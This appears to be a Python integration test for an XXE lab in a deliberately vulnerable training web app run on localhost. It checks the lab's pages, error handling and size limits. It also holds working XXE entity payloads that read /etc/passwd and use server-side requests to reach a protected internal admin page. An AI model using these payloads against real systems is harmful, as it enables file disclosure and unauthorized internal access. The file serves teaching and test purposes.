"""XXE integration checks against the local Apache/Compose stack."""
import urllib.error
import urllib.request

BASE = 'http://127.0.0.1:8888'
FLAG = 'SVWA{server_side_requests_cross_trust_boundaries}'


def request(path, body=None, status=200, content_type='application/xml'):
    data = body.encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data, {'Content-Type': content_type})
    try:
        response = urllib.request.urlopen(req, timeout=10)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        text = response.read().decode()
        assert response.status == status, (response.status, text)
        if data is not None:
            assert response.headers.get_content_type() == 'text/plain'
            assert response.headers['X-Content-Type-Options'] == 'nosniff'
        return text


def entity(uri):
    return f'<!DOCTYPE order [<!ENTITY xxe SYSTEM "{uri}">]><order><item>&xxe;</item></order>'


assert '/labs/xxe.php' in request('/')
page = request('/labs/xxe.php')
sidebar = page.split('</aside>')[0]
assert '<summary>XXE<span>' in sidebar
assert sidebar.index('<summary>XXE<span>') < sidebar.index('href="/settings.php"')
assert 'xml-order-form' in page
assert 'Your objectives' in page and 'Hint 3:' in page
assert 'xml-response-status' in page
assert '<details open><summary>XXE' in sidebar
assert 'Explanation and Fix' in request('/labs/xxe-explanation.php')
assert 'Canvas Backpack' in request('/labs/xxe.php', '<order><item>Canvas Backpack</item></order>')
assert 'root:x:0:0:' in request('/labs/xxe.php', entity('file:///etc/passwd'))
assert FLAG not in request('/internal/admin.php', status=403)
assert FLAG in request('/labs/xxe.php', entity('http://127.0.0.1/internal/admin.php'))
assert '<b>marker</b>' in request('/labs/xxe.php', '<order><item>&lt;b&gt;marker&lt;/b&gt;</item></order>')
for body in ['', '<order>', '<other/>', '<order><item>a</item><item>b</item></order>',
             entity('file:///does-not-exist-svwa'), entity('http://127.0.0.1:1/'),
             entity('ftp://127.0.0.1/test')]:
    request('/labs/xxe.php', body, status=400)
request('/labs/xxe.php', 'x' * 65537, status=413)
request('/labs/xxe.php', '{}', status=415, content_type='application/json')
assert 'xmlResult.textContent = await response.text()' in request('/assets/xxe.js')
print('XXE checks passed: discovery, normal XML, actual file read, internal SSRF, malformed input, resource failures, limits, and text output.')
